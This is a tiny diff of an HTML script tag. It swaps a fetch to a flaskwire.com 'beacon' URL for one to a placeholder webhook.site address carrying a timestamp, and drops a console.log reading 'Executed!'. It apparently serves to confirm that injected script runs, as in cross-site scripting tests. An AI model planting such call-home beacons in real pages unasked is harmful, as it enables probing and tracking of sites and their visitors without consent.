@@ -1,4 +1,4 @@
 <script>
-  console.log("🔥 Executed!");
-  fetch("https://flaskwire.com/beacon?ts=" + Date.now());
+  fetch("https://webhook.site/your-id?ts=" + Date.now());
 </script>
+
